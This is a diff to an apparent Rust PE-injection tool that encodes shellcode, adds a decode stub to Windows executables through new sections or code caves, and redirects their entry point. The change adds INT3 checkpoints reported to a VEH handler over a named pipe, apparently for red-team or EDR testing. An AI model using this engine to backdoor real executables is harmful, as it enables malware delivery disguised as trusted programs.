@@ -36,6 +36,7 @@ use sha2::{Digest, Sha256};
 use tracing::{debug, info, warn};
 
 use crate::mutator::MutationSpec;
+use crate::template::sc_checkpoints;
 use crate::template::{EncodingType, PayloadEncoder};
 use crate::transform::BinaryMutator;
 
@@ -114,6 +115,12 @@ pub struct PeInjectInput {
     pub injection_mode: InjectionMode,
     /// How to redirect execution to the carrier (default: HeaderPatch).
     pub redirect_mode: RedirectMode,
+    /// Number of INT3 shellcode checkpoints to insert (None or Some(0) = disabled).
+    /// When enabled, a VEH handler stub is prepended to catch breakpoints and
+    /// report progress via `\\.\pipe\rededr_checkpoints`.
+    pub sc_checkpoint_count: Option<u32>,
+    /// Path to xwin SDK sysroot (required when sc_checkpoint_count > 0).
+    pub xwin_dir: Option<PathBuf>,
 }
 
 /// Metadata about a successfully injected artifact.
@@ -139,6 +146,8 @@ pub struct InjectedArtifact {
     pub cave_section: Option<String>,
     /// Name of the target PE that was used (e.g., "procexp64.exe").
     pub target_pe_name: String,
+    /// Number of shellcode checkpoints inserted (0 if disabled).
+    pub checkpoint_count: u32,
 }
 
 /// PE injection engine.
@@ -174,10 +183,15 @@ impl PeInjector {
     ///
     /// Returns metadata about the produced artifact.
     pub fn inject(&self, input: &PeInjectInput) -> Result<InjectedArtifact> {
-        // Reject English encoding — produces text, not binary
+        // Reject encodings that produce non-raw-binary output
         if input.encoding == EncodingType::English {
             bail!(
                 "English encoding is not compatible with PE injection (produces text, not binary bytes)"
+            );
+        }
+        if input.encoding == EncodingType::ZombieZip {
+            bail!(
+                "ZombieZip encoding is not compatible with PE injection (produces ZIP container, needs runtime decompressor)"
             );
         }
 
@@ -227,9 +241,33 @@ impl PeInjector {
         let original_ep = read_u32(&pe_bytes, opt_header_off + 0x10);
         debug!("Original entry point: {:#x}", original_ep);
 
-        // 4. Encode payload
+        // 4. Checkpoint patching + encoding
+        //
+        // If checkpoints are requested, we:
+        //   a) Insert INT3 breakpoints into the RAW payload at instruction boundaries
+        //   b) Then encode the INT3-patched payload
+        // This way, after the decode stub runs in-place, the decoded bytes contain INT3s.
+        let checkpoint_count = input.sc_checkpoint_count.filter(|&c| c > 0).unwrap_or(0);
+        let checkpoint_table;
+
+        let payload_to_encode = if checkpoint_count > 0 {
+            let mut raw = input.payload.clone();
+            let patched = sc_checkpoints::patch_shellcode(&mut raw, checkpoint_count, 0)
+                .context("Failed to insert INT3 checkpoints into payload")?;
+            checkpoint_table = patched.table;
+            debug!(
+                "Inserted {} checkpoints into payload ({} bytes)",
+                checkpoint_table.len(),
+                patched.bytes.len()
+            );
+            patched.bytes
+        } else {
+            checkpoint_table = Vec::new();
+            input.payload.clone()
+        };
+
         let encoder = PayloadEncoder::new();
-        let encoded = encoder.encode(&input.payload, input.encoding);
+        let encoded = encoder.encode(&payload_to_encode, input.encoding);
         let encoded_data = &encoded.data;
         debug!(
             "Encoded payload: {} bytes (encoding: {:?})",
@@ -259,7 +297,7 @@ impl PeInjector {
                 (SUBBYTE_STUB_CODE, SUBBYTE_LAYOUT, reverse_lut.to_vec())
             }
             EncodingType::None => (NONE_STUB_CODE, NONE_LAYOUT, Vec::new()),
-            EncodingType::English => unreachable!(), // rejected above
+            EncodingType::English | EncodingType::ZombieZip => unreachable!(), // rejected above
         };
 
         // Build mutable copy of stub code for patching
@@ -287,12 +325,45 @@ impl PeInjector {
         }
         // If return_to_oep is true, OEP_DELTA is patched after we know the section RVA
 
-        // 6. Assemble section data: [stub | key | encoded_payload]
-        let mut section_data =
-            Vec::with_capacity(stub.len() + key_bytes.len() + encoded_data.len());
-        section_data.extend_from_slice(&stub);
-        section_data.extend_from_slice(&key_bytes);
-        section_data.extend_from_slice(encoded_data);
+        // 6. Assemble section data
+        let section_data = if !checkpoint_table.is_empty() {
+            // Instrumented path: [veh_stub | checkpoint_data | decode_stub | key | payload]
+            let xwin_dir = input.xwin_dir.as_ref().ok_or_else(|| {
+                anyhow::anyhow!("xwin_dir is required when sc_checkpoint_count > 0")
+            })?;
+            let stub_source = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("src")
+                .join("pe_inject")
+                .join("stub")
+                .join("veh_checkpoint_stub.c");
+            let cache_dir = self.config.output_dir.join(".veh_cache");
+
+            let (veh_code, veh_layout) =
+                stubs::compile_veh_stub(xwin_dir, &stub_source, &cache_dir)
+                    .context("Failed to compile VEH checkpoint stub")?;
+            debug!(
+                "VEH stub: {} bytes, data_lea@{:#x}, jmp@{:#x}",
+                veh_code.len(),
+                veh_layout.data_lea_disp_offset,
+                veh_layout.decode_jmp_disp_offset,
+            );
+
+            stubs::assemble_instrumented_section(
+                &veh_code,
+                &veh_layout,
+                &checkpoint_table,
+                &stub,
+                &key_bytes,
+                encoded_data,
+            )
+        } else {
+            // Standard path: [stub | key | encoded_payload]
+            let mut data = Vec::with_capacity(stub.len() + key_bytes.len() + encoded_data.len());
+            data.extend_from_slice(&stub);
+            data.extend_from_slice(&key_bytes);
+            data.extend_from_slice(encoded_data);
+            data
+        };
 
         // 7. Place section data in PE (mode-dependent)
         let mut injection_mode_used = input.injection_mode;
@@ -469,6 +540,7 @@ impl PeInjector {
             redirect_mode_used,
             cave_section,
             target_pe_name,
+            checkpoint_count: checkpoint_table.len() as u32,
         })
     }
 }
@@ -636,7 +708,7 @@ fn add_section(
 }
 
 /// Compute and write the standard PE checksum.
-fn compute_pe_checksum(pe_bytes: &mut Vec<u8>) {
+fn compute_pe_checksum(pe_bytes: &mut [u8]) {
     let opt_off = optional_header_offset(pe_bytes);
     let checksum_offset = opt_off + 0x40;
     if checksum_offset + 4 > pe_bytes.len() {
@@ -803,7 +875,7 @@ fn find_code_caves(pe_bytes: &[u8]) -> Vec<CodeCave> {
 ///
 /// Updates the section's VirtualSize to cover the written data.
 /// Returns the RVA where the data starts.
-fn inject_into_cave(pe_bytes: &mut Vec<u8>, cave: &CodeCave, data: &[u8]) -> Result<u32> {
+fn inject_into_cave(pe_bytes: &mut [u8], cave: &CodeCave, data: &[u8]) -> Result<u32> {
     if data.len() > cave.available {
         bail!(
             "Data ({} bytes) exceeds cave capacity ({} bytes)",
@@ -1090,7 +1162,7 @@ pub fn select_best_target(
         EncodingType::Xor => (XOR_STUB_CODE, XOR_LAYOUT, 2usize),
         EncodingType::SubByte => (SUBBYTE_STUB_CODE, SUBBYTE_LAYOUT, 256usize),
         EncodingType::None => (NONE_STUB_CODE, NONE_LAYOUT, 0usize),
-        EncodingType::English => return None, // not supported for PE injection
+        EncodingType::English | EncodingType::ZombieZip => return None, // not supported for PE injection
     };
     let _ = layout; // only need code_size from the stub
     let encoded_payload_size = match encoding {
@@ -1432,6 +1504,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1475,6 +1549,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1507,6 +1583,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1537,6 +1615,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         assert!(injector.inject(&input).is_err());
@@ -1563,6 +1643,8 @@ mod tests {
             return_to_oep: true,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1596,6 +1678,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1631,6 +1715,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1707,6 +1793,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1770,6 +1858,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::CodeCave,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1832,6 +1922,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::CodeCave,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1890,6 +1982,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::CodeCave,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1927,6 +2021,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::CodeCave,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -2027,6 +2123,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::CodeCave,
             redirect_mode: RedirectMode::EpHijack,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -2222,6 +2320,8 @@ mod tests {
             return_to_oep: false,
             injection_mode: InjectionMode::NewSection,
             redirect_mode: RedirectMode::HeaderPatch,
+            sc_checkpoint_count: None,
+            xwin_dir: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
